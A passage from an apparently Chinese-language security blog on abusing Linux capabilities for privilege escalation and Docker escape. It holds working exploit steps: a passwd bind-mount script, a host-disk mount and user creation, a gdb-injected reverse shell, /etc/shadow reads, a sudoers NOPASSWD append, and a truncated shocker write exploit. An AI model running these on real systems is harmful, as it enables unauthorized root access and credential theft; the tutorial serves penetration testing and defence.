alt="image.png"></p><blockquote><p>只能添加同时存在于CapPrm(Permitted)和CapInh(Inheritable)集合中的Capabilities</p></blockquote><p>具有Capabilities意识的二进制文件不会使用环境赋予的新Capabilities，但是capability低的二进制文件会使用它们，因为它们不会拒绝这些Capabilities。这使得在向二进制文件授予Capabilities的特殊环境中，capability低的二进制文件容易受到攻击。</p><h2 id="服务-Capabilities"><a href="#服务-Capabilities" class="headerlink" title="服务 Capabilities"></a>服务 Capabilities</h2><p>默认情况下，以root身份运行的服务将具有所有的capabilities，这是相当危险的。</p><p>因此，服务的配置文件允许指定希望它拥有的Capabilities，以及应该执行服务的用户，以避免以不必要的权限运行服务。<br><code>systemd</code>通过<code>AmbientCapabilities</code>变量为服务提供了配置Capabilities的指令</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[Service]</span><br><span class="line">User=<span class="built_in">test</span></span><br><span class="line">AmbientCapabilities=CAP_NET_BIND_SERVICE</span><br></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2023/01/09/pP9bYMCEWUemf48.png" alt="image.png"></p><h2 id="容器-Capabilities"><a href="#容器-Capabilities" class="headerlink" title="容器 Capabilities"></a>容器 Capabilities</h2><p>Docker容器不同于虚拟机，它共享宿主机操作系统内核。宿主机和容器之间通过内核命名空间（namespaces）、内核Capabilities、CGroups（control groups）等技术进行隔离。</p><p>在大部分情况下，容器里的进程不需要以root用户运行，Docker给容器内root只授予了几个<a href="https://github.com/moby/moby/blob/master/oci/caps/defaults.go">默认的Capabilities</a>，其他的禁用。这意味着容器里的root用户权限比宿主机上真正的root用户权限要小。</p><p>实际情况用户会存在自己给容器添加特权方便操作，比如额外添加一些Capability，例如SYS_ADMIN，以及运行具有<code>--privileged</code>或危险功能的 Docker 容器允许特权操作。</p><blockquote><p>–privileged标志给了容器所有的Capabilities，而且它还解除了设备cgroup控制器强制执行的所有限制，容器可以访问主机所有device以及具有mount操作的权限。但是–privileged参数不等于只是拥有所有的Capabilities，还包括禁用Seccomp和AppArmor等安全机制、访问device。换句话说，容器可以做主机可以做的几乎所有事情。</p></blockquote><p>当容器拥有特权后是可以逃逸到宿主机的，所以为了方便默认情况下Docker为容器启用了一些Capabilities，并且Kubernetes也可以给<a href="https://kubernetes.io/zh-cn/docs/tasks/configure-pod-container/security-context/#set-capabilities-for-a-container">容器配置Capabilities</a>。</p><p>容器内如果有命令<code>capsh</code>可以通过<code>capsh --print</code>查看当前的Capabilities<br>识别错误配置的Capabilities的最简单方法是使用枚举脚本，如<a href="https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS">LinPEAS</a><br><img src="https://s2.loli.net/2023/01/09/c9E4A86ja5iQemS.png" alt="image.png"></p><h2 id="特殊情况-空Capabilities"><a href="#特殊情况-空Capabilities" class="headerlink" title="特殊情况 空Capabilities"></a>特殊情况 空Capabilities</h2><p>可以给文件设置空的capability，这样或许会创建一个<code>set-user-ID-root</code>的程序，这将执行该程序的进程<code>effective</code>保存的<code>set-user-ID</code>改为0。<br>如果有一个文件符合下面的条件：</p><ol><li>不属于root</li><li><code>SUID/SGID</code>位没有设置</li><li>capabilities设置为空</li></ol><p>该文件将以root运行。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 比如如下情况</span></span><br><span class="line">$ <span class="built_in">getcap</span> &lt;filename&gt;</span><br><span class="line">&lt;filename&gt; =ep</span><br></pre></td></tr></table></figure><p>对tcpdump测试<br><img src="https://s2.loli.net/2023/01/09/s8qADYC1hXVzPEN.png" alt="image.png"><br>经过设置后普通用户也可以执行tcpdump<br><img src="https://s2.loli.net/2023/01/09/x31jidWvIsQqXMr.png" alt="image.png"></p><h1 id="利用-Capabilities"><a href="#利用-Capabilities" class="headerlink" title="利用 Capabilities"></a>利用 Capabilities</h1><p>以下是一些常见的 Capabilites 列表：</p><table><thead><tr><th>Capability 名称</th><th>描述</th></tr></thead><tbody><tr><td>CAP_CHOWN</td><td>修改文件所有者的权限</td></tr><tr><td>CAP_DAC_OVERRIDE</td><td>忽略文件的 DAC 访问限制</td></tr><tr><td>CAP_DAC_READ_SEARCH</td><td>忽略文件读及目录搜索的 DAC 访问限制</td></tr><tr><td>CAP_FOWNER</td><td>忽略文件属主 ID 必须和进程用户 ID 相匹配的限制</td></tr><tr><td>CAP_FSETID</td><td>允许设置文件的 setuid 位</td></tr><tr><td>CAP_KILL</td><td>允许对不属于自己的进程发送信号</td></tr><tr><td>CAP_LINUX_IMMUTABLE</td><td>允许修改文件的 IMMUTABLE 和 APPEND 属性标志</td></tr><tr><td>CAP_NET_ADMIN</td><td>允许执行网络管理任务</td></tr><tr><td>CAP_NET_BIND_SERVICE</td><td>允许绑定到小于 1024 的端口</td></tr><tr><td>CAP_NET_RAW</td><td>允许使用原始套接字</td></tr><tr><td>CAP_SETGID</td><td>允许改变进程的 GID</td></tr><tr><td>CAP_SETFCAP</td><td>允许为文件设置任意的 capabilities</td></tr><tr><td>CAP_SETUID</td><td>允许改变进程的 UID</td></tr><tr><td>CAP_SYS_ADMIN</td><td>允许执行系统管理任务，如加载或卸载文件系统、设置磁盘配额等</td></tr><tr><td>CAP_SYS_BOOT</td><td>允许重新启动系统</td></tr><tr><td>CAP_SYS_CHROOT</td><td>允许使用 chroot() 系统调用</td></tr><tr><td>CAP_SYS_MODULE</td><td>允许插入和删除内核模块</td></tr><tr><td>CAP_SYS_PTRACE</td><td>允许跟踪任何进程</td></tr><tr><td>CAP_SYS_RAWIO</td><td>允许直接访问 &#x2F;devport、&#x2F;dev&#x2F;mem、&#x2F;dev&#x2F;kmem 及原始块设备</td></tr><tr><td>CAP_SYSLOG</td><td>允许使用 syslog() 系统调用</td></tr></tbody></table><p>利用情况主要从两个方面：</p><ul><li>当二进制文件具有Capabilities</li><li>环境具有Capabilities主要是当前在容器内</li></ul><p>Capabilities信息收集</p><ul><li><p>二进制文件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 查找/下的所有具有Capabilities的二进制文件</span></span><br><span class="line"><span class="built_in">getcap</span> -r / 2&gt;/dev/null</span><br><span class="line"></span><br><span class="line"><span class="comment"># 查看单个二进制文件</span></span><br><span class="line"><span class="built_in">getcap</span> &lt;path&gt;</span><br></pre></td></tr></table></figure></li><li><p>环境容器内</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">capsh --<span class="built_in">print</span></span><br></pre></td></tr></table></figure><blockquote><p>以下主要列举利用意义大的一些Capabilities</p></blockquote></li></ul><h2 id="CAP-SYS-ADMIN"><a href="#CAP-SYS-ADMIN" class="headerlink" title="CAP_SYS_ADMIN"></a>CAP_SYS_ADMIN</h2><p>CAP_SYS_ADMIN: 允许执行系统管理任务，如加载或卸载文件系统、设置磁盘配额等<br>CAP_SYS_ADMIN在很大程度上是一种全面的Capabilities，它很容易导致额外的Capabilities或完全的root（通常是对所有Capabilities的访问）。CAP_SYS_ADMIN需要执行一系列的管理操作，如果在容器内执行特权操作，就很难从容器中删除。对于模仿整个系统的容器来说，保留这种Capabilities往往是必要的，而对于单独的应用程序容器来说，它的限制性更强。</p><p><strong>当文件具有能力：</strong><br>通过收集发现python具有该能力<br><img src="https://s2.loli.net/2023/01/09/UW8uPZzOMmtnx1J.png" alt="image.png"><br>通过python可以修改root的密码<br><img src="https://s2.loli.net/2023/01/09/94jQsL5MZDgYcrE.png" alt="image.png"><br>通过脚本将修改过的passwd文件<code>mount</code>到<code>/etc/passwd</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line">libc = CDLL(<span class="string">&quot;libc.so.6&quot;</span>)</span><br><span class="line">libc.mount.argtypes = (c_char_p, c_char_p, c_char_p, c_ulong, c_char_p)</span><br><span class="line">MS_BIND = <span class="number">4096</span></span><br><span class="line">source = <span class="string">b&quot;&lt;fake passwd 路径&gt;&quot;</span></span><br><span class="line">target = <span class="string">b&quot;/etc/passwd&quot;</span></span><br><span class="line">filesystemtype = <span class="string">b&quot;none&quot;</span></span><br><span class="line">options = <span class="string">b&quot;rw&quot;</span></span><br><span class="line">mountflags = MS_BIND</span><br><span class="line">libc.mount(source, target, filesystemtype, mountflags, options)</span><br></pre></td></tr></table></figure><p>成功root密码password登陆<br><img src="https://s2.loli.net/2023/01/09/VBFWIbH7dPfsn9M.png" alt="image.png"></p><p><strong>当环境具有能力：</strong><br>主要为当前可能是一个容器，通过信息收集发现当前环境具有<code>SYS_ADMIN</code></p><ul><li>挂载主机</li></ul><p>可以在容器内挂载宿主机磁盘</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">fdisk -l</span><br><span class="line">Disk /dev/sda: 4 GiB, 4294967296 bytes, 8388608 sectors</span><br><span class="line">Units: sectors of 1 * 512 = 512 bytes</span><br><span class="line">Sector size (logical/physical): 512 bytes / 512 bytes</span><br><span class="line">I/O size (minimum/optimal): 512 bytes / 512 bytes</span><br><span class="line"></span><br><span class="line">mount /dev/sda /mnt/</span><br><span class="line"><span class="built_in">cd</span> /mnt</span><br><span class="line"><span class="built_in">chroot</span> ./ bash</span><br></pre></td></tr></table></figure><ul><li>通过ssh</li></ul><p>通过挂载，之后创建一个用户，在使用该用户ssh连接</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#Like in the example before, the first step is to moun the dosker host disk</span></span><br><span class="line">fdisk -l</span><br><span class="line">mount /dev/sda /mnt/</span><br><span class="line"></span><br><span class="line"><span class="comment">#Then, search for open ports inside the docker host</span></span><br><span class="line">nc -v -n -w2 -z 172.17.0.1 1-65535</span><br><span class="line">(UNKNOWN) [172.17.0.1] 2222 (?) open</span><br><span class="line"></span><br><span class="line"><span class="comment">#Finally, create a new user inside the docker host and use it to access via SSH</span></span><br><span class="line"><span class="built_in">chroot</span> /mnt/ adduser john</span><br><span class="line">ssh john@172.17.0.1 -p 2222</span><br></pre></td></tr></table></figure><p>除此之外还可以通过<code>notify_on_release</code>进行逃逸参考<a href="https://blog.trailofbits.com/2019/07/19/understanding-docker-container-escapes/">理解Docker容器转义</a></p><h2 id="CAP-SYS-MODULE"><a href="#CAP-SYS-MODULE" class="headerlink" title="CAP_SYS_MODULE"></a>CAP_SYS_MODULE</h2><p>CAP_SYS_MODULE: 允许插入和删除内核模块<br>CAP_SYS_MODULE允许进程加载和卸载任意的内核模块（init_module(2), finit_module(2) 和 delete_module(2) 系统调用）。这可能导致微不足道的权限升级和ring-0妥协。内核可以被随意修改，颠覆所有系统安全、Linux安全模块和容器系统。</p><p><strong>当文件具有能力(内核编译参考环境部分)：</strong></p><ul><li>python：可以利用python加载内核模块</li><li>kmod：可以利用该命令插入内核模块</li></ul><p><strong>当环境具有能力：</strong></p><ul><li>容器：创建内核模块，通过nc接收反弹的shell可以参考<a href="https://blog.pentesteracademy.com/abusing-sys-module-capability-to-perform-docker-container-breakout-cf5c29956edd">Docker容器突破:滥用SYS MODULE能力</a>和<a href="https://www.cyberark.com/resources/threat-research-blog/how-i-hacked-play-with-docker-and-remotely-ran-code-on-the-host">破解 Play-with-Docker 并在主机上远程运行代码</a></li></ul><p>当python具有该能力<br>默认情况下，<code>modprobe</code>命令检查目录中的依赖列表和映射文件<code>/lib/modules/$(uname -r)</code><br>为了利用创建一个假的<code>lib/modules</code>文件夹</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">mkdir</span> lib/modules -p</span><br><span class="line"><span class="built_in">cp</span> -a /lib/modules/5.0.0-20-generic/ lib/modules/$(<span class="built_in">uname</span> -r)</span><br></pre></td></tr></table></figure><h2 id="CAP-SYS-PTRACE"><a href="#CAP-SYS-PTRACE" class="headerlink" title="CAP_SYS_PTRACE"></a>CAP_SYS_PTRACE</h2><p>CAP_SYS_PTRACE：允许跟踪任何进程<br><code>CAP_SYS_PTRACE</code> 允许使用 ptrace(2) 和最近引入的跨内存附加系统调用，如 process_vm_readv(2) 和 process_vm_writev(2) 。如果这个Capabilities被授予，并且 ptrace(2) 系统调用本身没有被 seccomp 过滤器阻止，这将允许攻击者绕过其他 seccomp 限制，请参考 PoC <a href="https://gist.github.com/thejh/8346f47e359adecd1d53">在允许 ptrace 时绕过 seccomp</a>。</p><p><strong>当文件具有能力：</strong>比如python时还可以参考<a href="https://www.cnblogs.com/zlgxzswjy/p/15185591.html">python Capabilities cap_sys_ptrace+ep提权</a><br><strong>当环境具有能力：</strong>比如在docker内时，可以通过<a href="https://blog.pentesteracademy.com/privilege-escalation-by-abusing-sys-ptrace-linux-capability-f6e6ad2a59cc">Shellcode注入</a>；或者当前环境具有<code>gdb</code>，可以从主机<code>debug</code>进程中调用<code>system</code>函数</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">gdb -p 1234</span><br><span class="line">(gdb) call (void)system(<span class="string">&quot;ls&quot;</span>)</span><br><span class="line">(gdb) call (void)system(<span class="string">&quot;sleep 5&quot;</span>)</span><br><span class="line">(gdb) call (void)system(<span class="string">&quot;bash -c &#x27;bash -i &gt;&amp; /dev/tcp/&lt;ip&gt;/&lt;port&gt; 0&gt;&amp;1&#x27;&quot;</span>)</span><br></pre></td></tr></table></figure><h2 id="CAP-DAC-READ-SEARCH"><a href="#CAP-DAC-READ-SEARCH" class="headerlink" title="CAP_DAC_READ_SEARCH"></a>CAP_DAC_READ_SEARCH</h2><p>CAP_DAC_READ_SEARCH：忽略文件读及目录搜索的 DAC 访问限制</p><p>CAP_DAC_READ_SEARCH 允许一个进程绕过文件读取和目录读取及执行的权限。虽然这被设计为用于搜索或读取文件，但它也授予进程调用<code>open_by_handle_at(2)</code>的权限。任何具有<code>CAP_DAC_READ_SEARCH</code>Capabilities的进程都可以使用<code>open_by_handle_at(2)</code>来获得对任何文件的访问，甚至是挂载命名空间之外的文件。传递给 <code>open_by_handle_at(2) </code>的句柄被认为是使用 <code>name_to_handle_at(2)</code> 获取的不透明标识符。然而，这个句柄包含了敏感和可篡改的信息，如inode号码。这是Sebastian Krahmer用<a href="https://medium.com/@fun_cuddles/docker-breakout-exploit-analysis-a274fff0e6b3">shocker</a>漏洞首次在Docker容器中显示的问题。</p><p><strong>当文件具有能力：</strong></p><ul><li><strong>tar</strong></li></ul><p>在根目录递归检测cap时发现tar具有<code>cap_dac_read_search</code>功能<br><img src="https://s2.loli.net/2023/01/09/IjaCiOqzdWvFgrc.png" alt="image.png"><br>当任何程序拥有cap_dac_read_searchCapabilities的有效集合时，这意味着它可以读取任何文件或对目录执行任何可执行的权限。该程序不能在目录中创建任何文件或修改现有文件，因为它需要写入权限，而这种Capabilities没有提供这种权限。<br><img src="https://s2.loli.net/2023/01/09/WAxq6ehvpo9mgQK.png" alt="image.png"></p><blockquote><p>因为在这种情况下，tar有这个权限。你不能目录升级权限，但如果你幸运的话，在取回影子文件后破解哈希密码。你可以通过包括&#x2F;etc&#x2F;shadow文件来执行一个简单的tar归档，然后再提取它</p></blockquote><p>当前可以利用tar具有的能力，将相关敏感文件打个包，然后再拿出来<br><img src="https://s2.loli.net/2023/01/09/CGAUwLeE92Obryd.png" alt="image.png"></p><ul><li>python</li></ul><p><img src="https://s2.loli.net/2023/01/09/ZIlvkq9gNCExW47.png" alt="image.png"><br>利用python列出<code>/root</code>下的所有文件</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">for</span> r, d, f <span class="keyword">in</span> os.walk(<span class="string">&#x27;/root&#x27;</span>):</span><br><span class="line">    <span class="keyword">for</span> filename <span class="keyword">in</span> f:</span><br><span class="line">        <span class="built_in">print</span>(filename)</span><br></pre></td></tr></table></figure><p>也可以读取指定文件如<code>/etc/shadow</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c <span class="string">&#x27;print(open(&quot;/etc/shadow&quot;, &quot;r&quot;).read())&#x27;</span></span><br></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2023/01/09/dmvqJb8hPpzaIM6.png" alt="image.png"></p><p><strong>当环境具有能力：</strong><br>参考该文章利用<a href="https://medium.com/@fun_cuddles/docker-breakout-exploit-analysis-a274fff0e6b3">shocker.c</a>，利用需要找到一个指向安装在主机上的东西的指针，文章使用<code>/.dockerinit</code>也可以修改为<code>/etc/hostname</code>该文件必须是挂载的主机中的文件，比如k8s中<code>kube-proxy</code>就将<code>/etc/hostname</code>该文件挂载</p><blockquote><p>Docker已经通过放弃CAP_DAC_READ_SEARCH（以及使用seccomp阻止对open_by_handle_at的访问）来缓解这个问题。</p></blockquote><h2 id="CAP-DAC-OVERRIDE"><a href="#CAP-DAC-OVERRIDE" class="headerlink" title="CAP_DAC_OVERRIDE"></a>CAP_DAC_OVERRIDE</h2><p>CAP_DAC_OVERRIDE: 忽略文件的 DAC 访问限制，可以写入任何文件<br>可以用来写文件，比如vim有该能力，可以修改sudo配置文件提权。</p><p><strong>当文件具有能力：</strong></p><ul><li><strong>vim</strong></li></ul><p>当vim具有该能力，可以修改如passwd 、sudoers或shadow等<br><img src="https://s2.loli.net/2023/01/09/KVIFzqf4WnZGbLH.png" alt="image.png"><br>修改相关文件进行利用<br><img src="https://s2.loli.net/2023/01/09/Qws5ptgMrJbLiKP.png" alt="image.png"></p><ul><li><strong>python</strong></li></ul><p>当python具有该能力，同样可以修改一些敏感文件提权<br><img src="https://s2.loli.net/2023/01/09/lU9TSkWw2MGJrF6.png" alt="image.png"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">file=<span class="built_in">open</span>(<span class="string">&quot;/etc/sudoers&quot;</span>,<span class="string">&quot;a&quot;</span>)</span><br><span class="line">file.write(<span class="string">&quot;username ALL=(ALL) NOPASSWD:ALL&quot;</span>)</span><br><span class="line">file.close()</span><br></pre></td></tr></table></figure><p><strong>当环境具有能力：</strong><br>想要逃逸还需要具有能力<code>CAP_DAC_READ_SEARCH</code>可以读取主机文件，对<code>shocker.c</code>进行修改，改为对主机写入任意文件</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;errno.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;dirent.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// gcc shocker_write.c -o shocker_write</span></span><br><span class="line"><span class="comment">// ./shocker_write /etc/passwd passwd </span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">my_file_handle</span> &#123;</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> handle_bytes;</span><br><span class="line">  <span class="type">int</span> handle_type;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">char</span> f_handle[<span class="number">8</span>];</span><br><span class="line">&#125;;</span><br><span class="line"><span class="type">void</span> <span class="title function_">die</span><span class="params">(<span class="type">const</span> <span class="type">char</span> * msg)</span> &#123;</span><br><span class="line">  perror(msg);</span><br><span class="line">  <span class="built_in">exit</span>(errno);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">dump_handle</span><span class="params">(<span class="type">const</span> <span class="keyword">struct</span> my_file_handle * h)</span> &#123;</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;[*] #=%d, %d, char nh[] = &#123;&quot;</span>, h -&gt; handle_bytes,</span><br><span class="line">    h -&gt; handle_type);</span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; h -&gt; handle_bytes; ++i) &#123;</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;0x%02x&quot;</span>, h -&gt; f_handle[i]);</span><br><span class="line">    <span class="keyword">if</span> ((i + <span class="number">1</span>) % <span class="number">20</span> == <span class="number">0</span>)</span><br><span class="line">      <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;\n&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (i &lt; h -&gt; handle_bytes - <span class="number">1</span>)</span><br><span class="line">      <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;, &quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;&#125;;\n&quot;</span>);</span><br><span class="line">&#125; </span><br><span class="line"><span class="type">int</span> <span class="title function_">find_handle</span><span class="params">(<span class="type">int</span> bfd, <span class="type">const</span> <span class="type">char</span> *path, <span class="type">const</span> <span class="keyword">struct</span> my_file_handle *ih, <span class="keyword">struct</span> my_file_handle *oh)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> fd;</span><br><span class="line">  <span class="type">uint32_t</span> ino = <span class="number">0</span>;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">my_file_handle</span> <span class="title">outh</span> =</span> &#123;</span><br><span class="line">    .handle_bytes = <span class="number">8</span>,</span><br><span class="line">    .handle_type = <span class="number">1</span></span><br><span class="line">  &#125;;</span><br><span class="line">  DIR * dir = <span class="literal">NULL</span>;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">dirent</span> * <span class="title">de</span> =</span> <span class="literal">NULL</span>;</span><br><span class="line">  path = <span class="built_in">strchr</span>(path, <span class="string">&#x27;/&#x27;</span>);</span><br><span class="line">  <span class="comment">// recursion stops if path has been resolved</span></span><br><span class="line">  <span class="keyword">if</span> (!path) &#123;</span><br><span class="line">    <span class="built_in">memcpy</span>(oh -&gt; f_handle, ih -&gt; f_handle, <span class="keyword">sizeof</span>(oh -&gt; f_handle));</span><br><span class="line">    oh -&gt; handle_type = <span class="number">1</span>;</span><br><span class="line">    oh -&gt; handle_bytes = <span class="number">8</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  ++path;</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;[*] Resolving &#x27;%s&#x27;\n&quot;</span>, path);</span><br><span class="line">  <span class="keyword">if</span> ((fd = open_by_handle_at(bfd, (<span class="keyword">struct</span> file_handle * ) ih, O_RDONLY)) &lt; <span class="number">0</span>)</span><br><span class="line">    die(<span class="string">&quot;[-] open_by_handle_at&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ((dir = fdopendir(fd)) == <span class="literal">NULL</span>)</span><br><span class="line">    die(<span class="string">&quot;[-] fdopendir&quot;</span>);</span><br><span class="line">  <span class="keyword">for</span> (;;) &#123;</span><br><span class="line">    de = readdir(dir);</span><br><span class="line">    <span class="keyword">if</span> (!de)</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;[*] Found %s\n&quot;</span>, de -&gt; d_name);</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">strncmp</span>(de -&gt; d_name, path, <span class="built_in">strlen</span>(de -&gt; d_name)) == <span class="number">0</span>) &#123;</span><br><span class="line">      <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;[+] Match: %s ino=%d\n&quot;</span>, de -&gt; d_name, (<span class="type">int</span>) de -&gt; d_ino);</span><br><span class="line">      ino = de -&gt; d_ino;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;[*] Brute forcing remaining 32bit. This can take a while...\n&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> (de) &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">uint32_t</span> i = <span class="number">0</span>; i &lt; <span class="number">0xffffffff</span>; ++i) &#123;</span><br><span class="line">      outh.handle_bytes = <span class="number">8</span>;</span><br><span class="line">      outh.handle_type = <span class="number">1</span>;</span><br><span class="line">      <span class="built_in">memcpy</span>(outh.f_handle, &amp; ino, <span class="keyword">sizeof</span>(ino));</span><br><span class="line">      <span class="built_in">memcpy</span>(outh.f_handle + <span class="number">4</span>, &amp; i, <span class="keyword">sizeof</span>(i));</span><br><span class="line">      <span class="keyword">if</span> ((i % (<span class="number">1</span> &lt;&lt; <span class="number">20</span>)) 